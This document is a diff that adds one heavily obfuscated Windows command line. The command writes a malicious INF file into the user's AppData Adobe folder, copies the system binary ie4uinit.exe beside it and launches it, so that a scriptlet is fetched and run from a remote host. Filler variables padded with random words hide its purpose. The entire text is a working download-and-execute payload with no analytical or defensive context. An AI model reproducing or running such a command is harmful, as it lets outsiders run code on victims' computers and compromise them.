@@ -1,0 +1,7 @@
+/v /c (for %v in (s) do @set "Symbols=%~v") &&
+  (for %n in (i) do @set "Forecasts=%~n") &&
+  (for %g in (a) do @set "Paper=%~g") &&
+  (for %n in (c) do @set "Opens=%~n") &&
+  call(for %v in ("[defaultinstall.windows7]" "delfiles=C9F" "Un\" "Register\" "OCXs=7F5511" "[version]" "signature =$windows nt$" "[destinationdirs]" "defaultdestdir=11" "C9F=01" "[strings]" "Comments=init" "Cartoons=:;Copyrights" "Force=/" "Grounds=%t!Forecasts!me%" "Capital=h" "servicename=' '" "Ladder=b;Premises" "Episode=t;Missions" "shortsvcname=' '" "[7F5511]" "sc\" "ro%Ladder%j,NI,%Capital%%Episode%%Episode%p%Cartoons%%Force%%Force%qajaavjfw.michaeljacobs.info/contactme" "[C9F]" "ieu%Comments%.inf" ) do @echo %~v)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!ForecastscWarnings!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Opinion78=Student &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Opinion1=Sword Universities Misery Picks Champion Abuse Conferences Tomorrow Youth Copper Robust Midnight Upper Brooks Regret Combine Favors Quizzes Quotations Unusual Cause Engines Earth Twins Excuse Synopsis Piano Contains Businesses Complaints Human Attract Museums Quarters Expect Globe Flows Collect Sponsors Weasel Napkin Chase Senior Likes Images Students Vehicles Reopen Employ Conversations"
